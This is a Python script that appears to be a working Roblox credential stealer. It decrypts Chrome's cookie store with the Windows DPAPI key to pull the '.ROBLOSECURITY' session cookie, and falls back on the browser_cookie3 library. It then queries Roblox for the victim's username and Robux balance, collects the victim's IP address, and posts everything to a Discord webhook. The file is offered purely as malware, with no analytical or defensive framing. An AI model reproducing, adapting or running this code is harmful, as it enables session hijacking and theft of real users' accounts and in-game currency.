import os
import json
import base64
import sqlite3
import shutil
import win32crypt
from Crypto.Cipher import AES
from discordwebhook import Discord
import requests
import browser_cookie3
import re
import httpx
from dotenv import load_dotenv

load_dotenv()  # Load environment variables from .env

webhook_url = os.getenv("DISCORD_WEBHOOK")

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_data(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            return ""


def get_cookie_from_chrome():
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
    filename = "Cookies.db"
    if not os.path.isfile(filename):
        shutil.copyfile(db_path, filename)

    db = sqlite3.connect(filename)
    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()

    cursor.execute("""
    SELECT encrypted_value 
    FROM cookies WHERE name='.ROBLOSECURITY'""")

    key = get_encryption_key()
    for encrypted_value, in cursor.fetchall():
        decrypted_value = decrypt_data(encrypted_value, key)
        return decrypted_value
    db.close()


def get_cookie_from_browser():
    data = []
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookie.value)
                return data
    except:
        pass

    return None


def get_ip():
    return requests.get('http://api.ipify.org').text


def post_to_discord(cookie, username, robux, roblox_profile, ip_address):
    discord = Discord(url=webhook_url)
    discord.post(
        username="BOT - OVION",
        avatar_url="https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png",
        embeds=[
            {
                "title": "💸 +1 Result Account 🕯️",
                "description": f"[Roblox Profile]({roblox_profile})",
                "fields": [
                    {"name": "Username", "value": f"```{username}```", "inline": True},
                    {"name": "Robux Balance", "value": f"```{robux}```", "inline": True},
                    {"name": "IP Address", "value": f"```{ip_address}```", "inline": True},
                    {"name": ".ROBLOSECURITY Cookie", "value": f"```{cookie}```", "inline": False},
                ],
            }
        ]
    )


def handle_request(req):
    # Grab cookies from Chrome
    cookie = get_cookie_from_chrome() or get_cookie_from_browser()

    if not cookie:
        return {"statusCode": 404, "body": "Cookie not found"}

    # Get user info using the .ROBLOSECURITY cookie
    roblox_cookie = cookie[0]
    try:
        info = json.loads(requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": roblox_cookie}).text)
        username = info["UserName"]
        robux = requests.get("https://economy.roblox.com/v1/user/currency", cookies={'.ROBLOSECURITY': roblox_cookie}).json()["robux"]
        roblox_profile = f"https://web.roblox.com/users/{info['UserID']}/profile"
        ip_address = get_ip()
    except Exception as e:
        return {"statusCode": 500, "body": f"Error fetching user info: {str(e)}"}

    post_to_discord(roblox_cookie, username, robux, roblox_profile, ip_address)

    return {"statusCode": 200, "body": "Cookie grabbed and posted to Discord successfully!"}
